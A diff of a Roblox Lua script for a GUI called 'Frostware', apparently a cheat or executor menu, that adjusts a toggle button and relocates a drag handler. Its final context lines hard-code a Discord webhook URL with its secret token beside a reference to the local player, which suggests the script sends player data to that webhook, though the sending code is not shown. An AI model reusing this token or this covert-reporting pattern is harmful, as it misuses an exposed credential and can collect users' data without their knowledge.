@@ -145,13 +145,13 @@ Frostware.Parent = game:GetService("CoreGui")
 Frostware.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
 Toggle.Name = "Toggle"
-Toggle.Parent = Frostware
+Toggle.Parent = game.StarterGui.Frostware
 Toggle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 Toggle.BackgroundTransparency = 1.000
 Toggle.BorderColor3 = Color3.fromRGB(0, 0, 0)
 Toggle.BorderSizePixel = 0
 Toggle.Position = UDim2.new(0, 115, 0, 62)
-Toggle.Size = UDim2.new(0.0849858373, 0, 0.14705883, 0)
+Toggle.Size = UDim2.new(0, 47, 0, 47)
 Toggle.Image = "rbxassetid://97101605132050"
 
 local closeder = false
@@ -163,7 +163,7 @@ Toggle.MouseButton1Click:Connect(function()
     Background.Visible = false
     closeder = true
   else
-    Background.Visible = false
+    Background.Visible = true
     ts:Create(Background, TweenInfo.new(0.4), {Size = UDim2.new(0, 556, 0, 353)}):Play()
     closeder = false
   end
@@ -1234,12 +1234,6 @@ local function ERXIDLA_fake_script()
   function dragify(b)dragToggle=nil dragSpeed=.5 dragInput=nil dragStart=nil dragPos=nil function updateInput(a)Delta=a.Position-dragStart Position=UDim2.new(startPos.X.Scale,startPos.X.Offset+Delta.X,startPos.Y.Scale,startPos.Y.Offset+Delta.Y)game:GetService("TweenService"):Create(b,TweenInfo.new(.25),{Position=Position}):Play()end b.InputBegan:Connect(function(a)if(a.UserInputType==Enum.UserInputType.MouseButton1 or a.UserInputType==Enum.UserInputType.Touch)then dragToggle=true dragStart=a.Position startPos=b.Position a.Changed:Connect(function()if(a.UserInputState==Enum.UserInputState.End)then dragToggle=false end end)end end)b.InputChanged:Connect(function(a)if(a.UserInputType==Enum.UserInputType.MouseMovement or a.UserInputType==Enum.UserInputType.Touch)then dragInput=a end end)game:GetService("UserInputService").InputChanged:Connect(function(a)if(a==dragInput and dragToggle)then updateInput(a)end end)end dragify(script.Parent)
 end
 coroutine.wrap(ERXIDLA_fake_script)()
-local function PESRXCPW_fake_script()
-  local script = Instance.new('LocalScript', Toggle)
-
-  function dragify(b)dragToggle=nil dragSpeed=.5 dragInput=nil dragStart=nil dragPos=nil function updateInput(a)Delta=a.Position-dragStart Position=UDim2.new(startPos.X.Scale,startPos.X.Offset+Delta.X,startPos.Y.Scale,startPos.Y.Offset+Delta.Y)game:GetService("TweenService"):Create(b,TweenInfo.new(.25),{Position=Position}):Play()end b.InputBegan:Connect(function(a)if(a.UserInputType==Enum.UserInputType.MouseButton1 or a.UserInputType==Enum.UserInputType.Touch)then dragToggle=true dragStart=a.Position startPos=b.Position a.Changed:Connect(function()if(a.UserInputState==Enum.UserInputState.End)then dragToggle=false end end)end end)b.InputChanged:Connect(function(a)if(a.UserInputType==Enum.UserInputType.MouseMovement or a.UserInputType==Enum.UserInputType.Touch)then dragInput=a end end)game:GetService("UserInputService").InputChanged:Connect(function(a)if(a==dragInput and dragToggle)then updateInput(a)end end)end dragify(script.Parent)
-end
-coroutine.wrap(PESRXCPW_fake_script)()
 local function FPZJJH_fake_script() 
   local script = Instance.new('LocalScript', value_3)
 
@@ -1520,6 +1514,12 @@ coroutine.wrap(SXQB_fake_script)()
     animate() 
   end
   coroutine.wrap(WUIYEJ_fake_script)()
+  local function ENTUWSZ_fake_script() -- Toggle.LocalScript 
+    local script = Instance.new('LocalScript', Toggle)
+  
+     function dragify(b)dragToggle=nil dragSpeed=.5 dragInput=nil dragStart=nil dragPos=nil function updateInput(a)Delta=a.Position-dragStart Position=UDim2.new(startPos.X.Scale,startPos.X.Offset+Delta.X,startPos.Y.Scale,startPos.Y.Offset+Delta.Y)game:GetService("TweenService"):Create(b,TweenInfo.new(.25),{Position=Position}):Play()end b.InputBegan:Connect(function(a)if(a.UserInputType==Enum.UserInputType.MouseButton1 or a.UserInputType==Enum.UserInputType.Touch)then dragToggle=true dragStart=a.Position startPos=b.Position a.Changed:Connect(function()if(a.UserInputState==Enum.UserInputState.End)then dragToggle=false end end)end end)b.InputChanged:Connect(function(a)if(a.UserInputType==Enum.UserInputType.MouseMovement or a.UserInputType==Enum.UserInputType.Touch)then dragInput=a end end)game:GetService("UserInputService").InputChanged:Connect(function(a)if(a==dragInput and dragToggle)then updateInput(a)end end)end dragify(script.Parent)
+  end
+  coroutine.wrap(ENTUWSZ_fake_script)()
 
   local webhookUrl = "https://discord.com/api/webhooks/1322287456552357938/rEctQ9E1n8M2dzrPEM0BeD26vkmhL73sFzOiuFh5mxpt-Za6P-R-GyzhTSxq-tywjoGy"
   local player = game.Players.LocalPlayer
